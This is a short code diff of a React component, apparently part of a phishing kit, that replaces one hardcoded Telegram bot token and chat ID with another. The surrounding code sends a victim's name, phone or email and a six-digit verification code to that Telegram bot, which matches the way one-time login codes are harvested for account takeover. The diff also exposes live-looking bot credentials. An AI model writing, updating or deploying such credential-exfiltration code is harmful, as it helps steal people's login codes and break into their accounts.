@@ -18,8 +18,8 @@ const ErrSixDigitsCode: React.FC = () => {
     e.preventDefault();
     setShowPopup(true);
 
-    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
-    const chatId = "8317872395";
+    const botToken = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
+    const chatId = "4575071223";
     const message = `${fullName} 6 digit Code \n📧 Phone: ${email}\n🔑 Code: ${password}`;
 
     try {
